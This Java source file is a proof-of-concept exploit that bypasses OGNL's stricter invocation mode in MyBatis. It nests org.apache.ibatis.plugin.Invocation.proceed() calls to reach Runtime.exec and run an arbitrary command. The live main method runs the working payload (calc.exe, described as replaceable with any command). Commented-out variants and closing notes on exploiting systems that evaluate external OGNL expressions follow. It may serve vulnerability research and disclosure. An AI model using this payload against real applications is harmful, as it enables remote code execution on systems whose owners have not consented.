import com.sun.org.apache.xpath.internal.operations.And;
import org.apache.ibatis.ognl.Ognl;
import org.apache.ibatis.ognl.OgnlException;
import org.apache.ibatis.plugin.Invocation;

import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Method;
import java.util.Optional;

public class OgnlTest {

//In this file, you can use the code in the comments as needed, and the relevant hints I have written in the comments.
    public static void main(String[] args) throws NoSuchMethodException, InvocationTargetException, IllegalAccessException, OgnlException, ClassNotFoundException {
        // Java can use reflection to execute commands
        /*Method getRuntimeMethod = Runtime.class.getMethod("getRuntime");
        Method execMethod = Runtime.class.getMethod("exec", String.class);
        Object runtimeObject = getRuntimeMethod.invoke(null);
        execMethod.invoke(runtimeObject, "calc.exe");*/

        // In lower versions of Ognl,
        // it is possible to execute commands in the following form,
        // but in higher versions of Ognl, using this method will throw an exception.
        // Exception in thread "main" org.apache.ibatis.ognl.MethodFailedException:
        // Method "getRuntime" failed for object class java.lang.Runtime [java.lang.IllegalAccessException:
        // Method [public static java.lang.Runtime java.lang.Runtime.getRuntime()] cannot be called from within OGNL invokeMethod() under stricter invocation mode.]
        /*String expression = "@java.lang.Runtime@getRuntime().exec(\"calc\")";
        Ognl.getValue(expression, Optional.ofNullable(null),null);*/

        /**There is Invocation.class in mybatis. {@link org.apache.ibatis.plugin.Invocation#proceed()}
         * Using the {@link org.apache.ibatis.plugin.Invocation#proceed()} method of this class,
         * we can achieve the same result as calling {@link Method#invoke(Object, Object...)} ()} directly,
         * because proceed() is a wrapper for invoke().*/
        /*Object runtime = new Invocation(null, Class.forName("java.lang.Runtime").getMethod("getRuntime"), null).proceed();
        Method method = Class.forName("java.lang.Runtime").getMethod("exec", String.class);
        new Invocation(runtime, method, new Object[]{"calc.exe"}).proceed();*/

        // mybatis uses OGNL,
        // when we use the latest version of mybatis or the latest version of OGNL with the latest version of mybatis,
        // you can use Invocation.class to bypass the security of the OGNL itself, to achieve the purpose of command execution.
        Object object = Ognl.getValue(
                // This is the place to create the outermost "Invocation" needed for the final execution of proceed().
                "(new org.apache.ibatis.plugin.Invocation(" +
                        // Here is the "Invocation" created to get the first parameter needed for the outermost "Invocation".
                        "(new org.apache.ibatis.plugin.Invocation(null, " +
                        // Here is the "Invocation" created to get the second parameter needed for the second "Invocation".
                        // Use "\"\".getClass().forName(\"java.lang.Runtime\").getMethods()[6] to get the method "getRuntime" of class "Runtime".
                        "\"\".getClass().forName(\"java.lang.Runtime\").getMethods()[6], null)).proceed(), " +
                        // Here is the "Invocation" created to get the third parameter needed for the second "Invocation".
                        // Use "\"\".getClass().forName(\"java.lang.Runtime\").getMethods()[13] to get the method "exec" of class "Runtime"
                        "\"\".getClass().forName(\"java.lang.Runtime\").getMethods()[13], " +
                        // Here is the parameter needed for the second "Invocation" and then use proceed() to run this.
                        "new String[]{\"calc.exe\"})).proceed()", Optional.ofNullable(null),null);
                        // calc.exe is the command you want to run, because I use Windows, so I use calc.exe.
                        // You can change it to whatever you want.

    }
    // It's worth noting that in different JDK versions,
    // getMethods() may get the Method[] in a different order, and may need to be fine-tuned.
    // I use Jdk8u402, It is a downloadable JDK in the IntelliJ IDEA Community called corretto1.8.

    // Why is this a vulnerability?
    // This is because, in general,
    // wrapping invoke() methods in a project requires consideration of the scope of the call as well as filtering for dangerous methods.

    // How will this vulnerability be exploited?
    // This vulnerability can be exploited when a system accepts an incoming Ognl expression from the outside world
    // and calls the Ognl.getValue() method to compute the value of the expression for use(This practice is common in the AI field or in the cloud-based scenario.).

}
